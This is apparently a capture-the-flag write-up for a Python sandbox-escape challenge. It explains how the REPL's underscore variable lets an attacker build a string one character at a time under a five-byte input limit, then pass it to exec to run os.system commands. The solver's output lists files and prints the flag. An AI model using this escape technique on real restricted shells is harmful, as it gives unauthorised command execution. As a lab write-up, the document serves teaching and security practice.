# Solution

The trick is to use the underscore sign which stores the previous result. This way you can build the command and execute it in 5 bytes.

```
$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 'i'
'i'
>>> _
'i'
>>> _+'m'
'im'
>>> _
'im'
>>> _+'p'
'imp'
>>> _
'imp'
>>> exec
<built-in function exec>
>>> _
<built-in function exec>
>>> _('print(1)')
1
>>> 
```

Solution is in `escapy-solution.py`.

Script output:
```
$ python3 solve.py 
[+] Opening connection to 192.168.57.1 on port 9000: Done
[*] Switching to interactive mode
'i'
>>> 'im'
>>> 'imp'
>>> 'impo'
>>> 'impor'
>>> 'import'
>>> 'import '
>>> 'import o'
>>> 'import os'
>>> 'import os;'
>>> 'import os; '
>>> 'import os; o'
>>> 'import os; o='
>>> 'import os; o=o'
>>> 'import os; o=os'
>>> 'import os; o=os.'
>>> 'import os; o=os.s'
>>> 'import os; o=os.sy'
>>> 'import os; o=os.sys'
>>> 'import os; o=os.syst'
>>> 'import os; o=os.syste'
>>> 'import os; o=os.system'
>>> 'import os; o=os.system;'
>>> 'import os; o=os.system; '
>>> 'import os; o=os.system; o'
>>> 'import os; o=os.system; o('
>>> 'import os; o=os.system; o("'
>>> 'import os; o=os.system; o("l'
>>> 'import os; o=os.system; o("ls'
>>> 'import os; o=os.system; o("ls"'
>>> 'import os; o=os.system; o("ls")'
>>> 'import os; o=os.system; o("ls");'
>>> 'import os; o=os.system; o("ls"); '
>>> 'import os; o=os.system; o("ls"); o'
>>> 'import os; o=os.system; o("ls"); o('
>>> 'import os; o=os.system; o("ls"); o("'
>>> 'import os; o=os.system; o("ls"); o("c'
>>> 'import os; o=os.system; o("ls"); o("ca'
>>> 'import os; o=os.system; o("ls"); o("cat'
>>> 'import os; o=os.system; o("ls"); o("cat '
>>> 'import os; o=os.system; o("ls"); o("cat *'
>>> 'import os; o=os.system; o("ls"); o("cat *f'
>>> 'import os; o=os.system; o("ls"); o("cat *fl'
>>> 'import os; o=os.system; o("ls"); o("cat *fla'
>>> 'import os; o=os.system; o("ls"); o("cat *flag'
>>> 'import os; o=os.system; o("ls"); o("cat *flag.'
>>> 'import os; o=os.system; o("ls"); o("cat *flag.t'
>>> 'import os; o=os.system; o("ls"); o("cat *flag.tx'
>>> 'import os; o=os.system; o("ls"); o("cat *flag.txt'
>>> 'import os; o=os.system; o("ls"); o("cat *flag.txt"'
>>> 'import os; o=os.system; o("ls"); o("cat *flag.txt")'
>>> >>> <built-in function exec>
>>> console.py                      totally-not-guessable-flag.txt
ibctf{und3rsc0r3_0r13nt3d-pr0gr4mm1ng}
>>> $  
```
